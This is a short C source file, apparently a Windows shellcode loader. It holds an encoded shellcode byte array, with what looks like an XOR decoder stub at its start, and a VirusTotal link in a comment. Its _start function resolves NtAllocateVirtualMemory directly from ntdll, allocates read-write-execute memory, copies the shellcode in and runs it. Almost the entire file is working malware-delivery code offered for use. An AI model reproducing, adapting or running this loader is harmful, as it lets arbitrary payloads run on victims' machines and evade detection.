#include <winternl.h>
#include <windows.h>

/*
    https://www.virustotal.com/gui/file/14ee510c27b0bd6224650065aff5464a041e76e41a09f2a76571b4f72863bdf7
*/

unsigned char buf[] =
"\x4d\x31\xed\x49\x89\xe3\x48\xba\xfe\x5e\x23\xc2\x60\x06"
"\x25\x7d\xd9\xec\x41\xb5\x2f\x66\x41\x81\xe3\xe0\xf4\x49"
"\x0f\xae\x03\x49\x83\xc3\x08\x49\x8b\x0b\x49\xff\xcd\x4a"
"\x31\x54\xe9\x23\x4d\x85\xed\x75\xf3\xb6\x6f\xea\x19\xb1"
"\x4f\x9f\x1b\xfd\x4c\x4d\x89\xdc\x3c\x89\x34\x77\xb8\x92"
"\xeb\x06\x47\xa4\x9b\xde\xa6\x6a\xcd\xce\x00\x6c\xf6\x88"
"\x56\x6b\x3d\xa9\x4a\x14\x29\x30\x72\x6b\x47\xa9\x73\xd6"
"\x56\xcc\x9e\x05\x00\x3a\xe7\x41\x7d\x7c\xaa\xcd\x78\x9d"
"\x8e\xaa\x53\x46\xfa\x50\x45\x51\x72\x31\x34\x6f\x04\x42"
"\x27\xda\x74\x02\x4d\xf5\x05\xb2\x43\x96\x0d\xd5\xc9\xd4"
"\x01\xc8\x5b\xa9\xcf\xc3\x4e\xb2\x25\xf3\xd9\x33\xae\x3f"
"\x06\x70\x90\x42\x61\xa1\xff\x69\x4e\x00\x13\x66\x79\x78"
"\xfc\x5f\x4e\xba\x93\x1b\x79\x78\xfc\x1f\x4e\xba\xb3\x53"
"\x79\xfc\x19\x75\x4c\x7c\xf0\xca\x79\xc2\x6e\x93\x3a\x50"
"\xbd\x01\x1d\xd3\xef\xfe\xcf\x3c\x80\x02\xf0\x11\x43\x6d"
"\x47\x60\x89\x88\x63\xd3\x25\x7d\x3a\x79\xc0\xd3\xba\x73"
"\x26\x3f\x06\x31\x89\x86\xf1\x87\xc9\x77\x07\xe1\x91\x88"
"\x79\xeb\xea\xb4\x46\x11\x88\x02\xe1\x10\xf8\x77\xf9\xf8"
"\x80\x88\x05\x7b\xe6\x3e\xd0\x7c\xf0\xca\x79\xc2\x6e\x93"
"\x47\xf0\x08\x0e\x70\xf2\x6f\x07\xe6\x44\x30\x4f\x32\xbf"
"\x8a\x37\x43\x08\x10\x76\xe9\xab\xea\xb4\x46\x15\x88\x02"
"\xe1\x95\xef\xb4\x0a\x79\x85\x88\x71\xef\xe7\x3e\xd6\x70"
"\x4a\x07\xb9\xbb\xaf\xef\x47\x69\x80\x5b\x6f\xaa\xf4\x7e"
"\x5e\x70\x98\x42\x6b\xbb\x2d\xd3\x26\x70\x93\xfc\xd1\xab"
"\xef\x66\x5c\x79\x4a\x11\xd8\xa4\x51\xc0\xf9\x6c\x89\xb9"
"\x30\xf3\xae\x3f\x06\x31\xc1\x03\x79\x7e\x23\x3e\x07\x31"
"\xc1\x42\x8b\xc2\x25\x50\x81\xce\x14\xb8\xc1\x46\x0c\x69"
"\x47\x8b\x67\x96\x8c\x6e\x51\xea\x4e\xb2\x05\x2b\x0d\xf5"
"\xd2\x35\x86\xca\x21\x76\x34\x48\xe9\x2c\x74\x5e\xab\x03"
"\x68\xb2\x27\xe5\xf9\xe4\xa4\x7b\x41\x9f\xc1\x4d\x63\x43"
"\xef\x66\x49\x96\xae\xc9\x5a";

void _memcpy(void *dest, const void *src, size_t n) { // could be made inline.
    unsigned char *d = (unsigned char *)dest;
    const unsigned char *s = (const unsigned char *)src;
    for (size_t i = 0; i < n; i++) {
        d[i] = s[i];
    }
}

typedef NTSTATUS(NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE    ProcessHandle,
    PVOID    *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

void _start() {
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory =
        (NtAllocateVirtualMemory_t)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"),
            "NtAllocateVirtualMemory"
        );

    PVOID exec = NULL;
    SIZE_T size = sizeof(buf);
    NTSTATUS status = NtAllocateVirtualMemory(
        (HANDLE)-1,                // Current process handle
        &exec,                     // Address of allocated memory
        0,                         // ZeroBits
        &size,                     // Size of the region
        MEM_COMMIT | MEM_RESERVE,  // Allocation type
        PAGE_EXECUTE_READWRITE     // Memory protection
    );

    _memcpy(exec, buf, sizeof(buf));
    ((void(*)())exec)(); // Execute the shellcode
}